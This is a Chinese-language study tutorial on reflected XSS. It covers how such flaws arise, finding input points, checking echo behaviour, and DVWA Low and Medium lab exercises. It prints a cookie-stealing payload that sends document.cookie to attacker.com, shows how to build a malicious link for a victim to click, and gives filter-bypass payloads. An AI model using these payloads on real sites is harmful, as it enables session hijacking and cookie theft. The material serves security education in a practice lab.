# 反射型 XSS 

---

吃透反射型XSS的原理，掌握“输入点查找”和“回显判断”的核心方法。

### 核心任务

1. **原理深度理解**

    - 牢记核心定义：**用户输入直接输出到页面，无过滤，执行恶意JS**。

    - 绘制数据流向图：用户输入恶意Payload → 服务器接收并直接响应 → 浏览器解析HTML时执行恶意脚本。

2. **基础Payload拆解**

    - 分析 `<script>alert(1)</script>`：

        - `<script>`：告诉浏览器这是一段JavaScript代码。

        - `alert(1)`：触发弹窗，验证XSS漏洞存在（无实际危害，仅用于测试）。

        - 注意：Payload需完整闭合标签，避免被页面原有HTML打断。

3. **输入点查找与回显判断**

    - 输入点查找：

        - 页面可见输入框（如搜索框、姓名输入框）。

        - URL参数（如`?keyword=test`，需检查参数值是否回显到页面）。

        - 抓包分析（Burp Suite）：查看请求参数，定位所有用户可控输入点。

    - 回显判断：

        - 输入特殊字符（如`<>"'&`），查看页面源码是否直接输出（无转义则存在风险）。

        - 若输入`<script>alert(1)</script>`后弹窗，说明无过滤，可直接利用。

---

### 目标

完成DVWA XSS Reflected Low难度实操，掌握反射型XSS的完整利用流程。

### 核心任务

1. **DVWA Low难度实操**

    - 步骤1：访问DVWA，进入“XSS Reflected”模块，安全等级设为Low。

    - 步骤2：输入基础Payload `<script>alert(1)</script>`，提交后观察弹窗（验证漏洞存在）。

    - 步骤3：抓包分析（Burp Suite）：

        - 用Repeater模块重放请求，修改Payload为 `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`，模拟窃取Cookie（需本地搭建简易服务器接收数据）。

    - 步骤4：构造恶意链接：将Payload编码后拼接在URL中（如`http://localhost:8080/vulnerabilities/xss_r/?name=<script>alert(1)</script>`），诱导“受害者”点击触发XSS。

### 核心任务

1. **DVWA Medium难度挑战**

    - 分析过滤规则：Medium难度会过滤`<script>`标签，需用事件触发Payload绕过。

    - 尝试Payload：

        ```HTML
        
        <img src=x onerror=alert(1)>
        <ScRiPt>alert(1)</ScRiPt> <!-- 大小写混淆绕过 -->
        ```

    - 抓包分析响应内容，定位过滤逻辑（如仅过滤小写`<script>`）。

### 核心任务

1. **知识体系梳理**

    - 总结反射型XSS利用流程：

        1. 定位用户可控输入点（输入框、URL参数等）。

        2. 测试回显逻辑（输入特殊字符，查看是否直接输出）。

        3. 构造Payload（根据过滤规则选择基础/事件触发/绕过型Payload）。

        4. 验证利用（弹窗、窃取Cookie或执行其他恶意操作）。

    - 整理Burp Suite在XSS测试中的常用操作：抓包、重放、Payload注入、响应分析。

2. **错题与反思**

    - 回顾实操中遇到的问题（如Payload未触发、过滤规则未绕过），分析原因并记录解决方案。

    - 思考：反射型XSS的危害（窃取Cookie、钓鱼、劫持会话），以及防护措施（输入过滤、输出转义、CSP策略）。
> （注：文档部分内容可能由 AI 生成）